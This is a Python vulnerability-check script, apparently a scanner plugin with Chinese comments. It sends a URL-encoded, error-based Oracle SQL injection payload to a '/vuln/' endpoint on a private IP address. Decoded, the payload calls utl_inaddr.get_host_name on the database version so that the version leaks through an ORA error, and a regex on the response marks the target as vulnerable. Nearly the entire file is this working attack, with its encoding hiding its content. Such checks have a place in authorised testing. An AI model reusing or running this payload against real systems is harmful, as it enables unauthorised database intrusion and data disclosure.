import re
import requests


def check(url,proxies,timeout):
    if proxies:
        proxies = {proxies['protocol']: proxies['protocol'] + '://' + proxies['ip'] + ':' + str(proxies['port'])}
    try:
        ret = {'success': False, 'response': [], 'requests': [], 'error': [], 'info': []}
        payload='/vuln/?q=%32%30%29%20%3d%20%31%20%4f%52%20%28%73%65%6c%65%63%74%20%75%74%6c%5f%69%6e%61%64%64%72%2e%67%65%74%5f%68%6f%73%74%5f%6e%61%6d%65%28%28%53%45%4c%45%43%54%20%76%65%72%73%69%6f%6e%20%46%52%4f%4d%20%76%24%69%6e%73%74%61%6e%63%65%29%29%20%66%72%6f%6d%20%64%75%61%6c%29%20%69%73%20%6e%75%6c%6c%20%4f%52%20%28%31%2b%31'
        s=requests.get(url+f'{payload}',timeout=timeout,proxies=proxies).text
        result=re.findall("(ORA-\d+: host \S+ unknown)",s,re.DOTALL)[0]
        if result:
            ret['success']=True
    except Exception as e:
        ret['error']=e
    return ret


def main(params):
    result = params.get('result',{})
    url=params.get('url','')
    headers=params.get('headers',{})
    proxies=params.get('proxies',None)      #代理
    timeout=params.get('timeout',5)           #超时时间
    result = check(url,proxies,timeout)
    return result


if __name__ == '__main__':
    params = {
        'result': {'success': False, 'response': [], 'requests': [], 'error': []},
        # headers：传入的header参数
        'headers': {},
        # proxy：传入的代理服务器参数
        'proxies': {'protocol': 'http', 'ip': '127.0.0.1', 'port': 8080},
        'timeout': 30,
        ###可选参数###
        'url': "http://192.168.160.201:8000",
    }
    print(main(params))